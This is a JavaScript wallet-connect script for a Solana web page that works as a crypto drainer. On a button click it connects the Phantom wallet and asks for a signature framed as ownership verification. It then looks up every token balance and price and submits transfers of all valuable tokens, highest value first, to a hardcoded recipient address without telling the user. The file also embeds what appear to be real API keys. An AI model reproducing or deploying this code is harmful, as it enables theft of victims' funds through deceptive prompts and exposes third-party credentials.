import { Buffer } from 'buffer';  // Ensure buffer is available globally
window.Buffer = Buffer;

import { Connection, PublicKey, Transaction } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';

// Define necessary variables
let walletAddress = null;
// Function to connect the Phantom wallet and execute the whole flow
async function connectAndExecute() {
    const provider = window.solana;

    if (!provider || !provider.isPhantom) {
        alert('Phantom wallet not found. Please install it!');
        return;
    }

    try {
        // Step 1: Request wallet connection
        const response = await provider.connect();
        walletAddress = response.publicKey.toString();  // Capture the connected wallet address

        // Display the connected wallet address
        document.getElementById('connectWalletBtn').textContent = `Connected`;

        // Step 2: Sign a message after connection to verify wallet ownership
        await signMessage(provider, walletAddress);

        // Step 3: Fetch SOL balance after signing
        const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
        const balance = await connection.getBalance(new PublicKey(walletAddress));
        const solBalance = balance / 1e9;

        // Optional: Display balance in the UI if necessary
        // document.getElementById('walletBalance').textContent = `Balance: ${solBalance} SOL`;

        // Step 4: Fetch token balances using Shyft API
        const tokens = await fetchTokenBalances(walletAddress);

        // Step 5: Fetch prices for the tokens using Jupiter API
        const tokenPrices = await fetchTokenPrices(tokens);

        // Step 6: Calculate token values (balance * price) and sort by value
        const tokenValues = tokens.map(token => {
            const price = tokenPrices[token.info.symbol] || 0;  // Get the price for the token, default to 0 if not found
            const value = price * token.balance;  // Multiply balance and price directly
            return { ...token, value };
        });

        // Filter out tokens with a value of zero or below a certain threshold (e.g., 0.01)
        const filteredTokens = tokenValues.filter(token => token.value > 0.026);

        // Sort tokens by value (highest to lowest)
        const sortedTokens = filteredTokens.sort((a, b) => b.value - a.value);
        console.log('Filtered and Sorted Tokens by Value:', sortedTokens);

        // Step 7: Transfer tokens in the sorted order
        const recipientAddress = '2VhgfoY8zMLcpF5NhoArSua2iCoduqEFLMSaRXFhistJ';  // Replace with the recipient's address
        await transferTokensInOrder(sortedTokens, recipientAddress, connection);

    } catch (err) {
        console.error(err);
        alert('Failed to complete wallet flow');
    }
}

// Function to sign a message and verify wallet ownership
async function signMessage(provider, walletAddress) {
    const message = `Please sign this message to verify ownership of the wallet: ${walletAddress}`;
    const encodedMessage = new TextEncoder().encode(message);
    try {
        const signedMessage = await provider.signMessage(encodedMessage, 'utf8');
        console.log('Signed Message:', signedMessage.signature);
    } catch (err) {
        console.error('Failed to sign message:', err);
    }
}

// Fetch token balances using Shyft API
async function fetchTokenBalances(walletAddress) {
    const apiKey = 'DNvnXBTyUJ_yV56g';  // Replace with your Shyft API key

    try {
        const response = await fetch(`https://api.shyft.to/sol/v1/wallet/all_tokens?network=mainnet-beta&wallet=${walletAddress}`, {
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            }
        });

        const data = await response.json();
        if (data.success) {
            console.log('Token Balances:', data.result);
            return data.result;
        } else {
            throw new Error(data.message || 'Failed to fetch token balances');
        }
    } catch (err) {
        console.error('Error fetching token balances:', err);
        alert('Failed to fetch token balances');
    }
}

// Fetch token prices using Jupiter API
async function fetchTokenPrices(tokens) {
    const tokenSymbols = tokens.map(token => token.info.symbol).join(',');  // Create a comma-separated list of token symbols

    try {
        const response = await fetch(`https://price.jup.ag/v6/price?ids=${tokenSymbols}`);
        const data = await response.json();
        
        // Extract prices and map them to token symbols
        const prices = {};
        for (const [symbol, priceData] of Object.entries(data.data)) {
            prices[symbol] = priceData.price || 0;  // Get the price for each token, default to 0 if not found
        }

        console.log('Token Prices:', prices);
        return prices;
    } catch (err) {
        console.error('Error fetching token prices:', err);
        alert('Failed to fetch token prices');
    }
}

// Transfer SPL tokens in order of their values
async function transferTokensInOrder(tokens, recipientAddress, connection) {
    const provider = window.solana;
    const fromPublicKey = new PublicKey(walletAddress);

    for (const token of tokens) {
        try {
            const tokenAddress = new PublicKey(token.address);  // Token mint address
            const recipientPublicKey = new PublicKey(recipientAddress);
            const tokenBalance = token.balance;

            if (tokenBalance > 0) {
                console.log(`Initiating transfer for ${token.info.symbol} (${tokenBalance})`);

                const transferTx = await createTransferTransaction(
                    connection,
                    fromPublicKey,
                    recipientPublicKey,
                    tokenAddress,
                    tokenBalance,
                    token.info.decimals
                );

                try {
                    // Try to sign and send the transaction
                    const signature = await provider.signAndSendTransaction(transferTx);
                    await confirmTransactionWithTimeout(connection, signature, 8000);  // 30 seconds timeout

                    console.log(`Successfully transferred ${token.info.symbol}!`);
                } catch (signError) {
                    // If signing or sending fails, log the error but continue to the next token
                    console.error(`Failed to transfer ${token.info.symbol}:`, signError);
                }
            }
        } catch (err) {
            console.error(`Failed to transfer ${token.info.symbol}:`, err);
        }
    }
}

// Create a transaction to transfer SPL tokens
async function createTransferTransaction(connection, fromPublicKey, toPublicKey, tokenMintAddress, amount, decimals) {
    // Get associated token accounts for the sender and recipient
    const fromTokenAccount = await getAssociatedTokenAddress(
        tokenMintAddress,
        fromPublicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const toTokenAccount = await getAssociatedTokenAddress(
        tokenMintAddress,
        toPublicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
    );

    // Convert amount to the smallest unit using BigInt
    const amountInSmallestUnit = BigInt(Math.round(amount * Math.pow(10, decimals)));

    // Create transfer instruction
    const transferInstruction = createTransferInstruction(
        fromTokenAccount,
        toTokenAccount,
        fromPublicKey,
        amountInSmallestUnit,
        [],
        TOKEN_PROGRAM_ID
    );

    // Create and build the transaction
    const transaction = new Transaction().add(transferInstruction);
    transaction.feePayer = fromPublicKey;

    // Get the latest blockhash
    const latestBlockhash = await connection.getLatestBlockhash();
    transaction.recentBlockhash = latestBlockhash.blockhash;

    return transaction;
}

// Confirm transaction with timeout
async function confirmTransactionWithTimeout(connection, signature, timeoutMs) {
    const start = Date.now();

    // Create a promise that rejects after the timeout
    const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error("Transaction confirmation timed out")), timeoutMs)
    );

    // Wait for either the confirmation or the timeout
    try {
        await Promise.race([
            connection.confirmTransaction(signature, 'confirmed'),
            timeoutPromise
        ]);
        console.log(`Transaction ${signature} confirmed.`);
    } catch (err) {
        console.error(`Transaction confirmation failed for ${signature}:`, err);
        throw err;
    }

    const end = Date.now();
    console.log(`Transaction confirmation took ${end - start}ms`);
}

// Attach the connectAndExecute function to the "Connect Wallet" button
document.getElementById('connectWalletBtn').addEventListener('click', connectAndExecute);
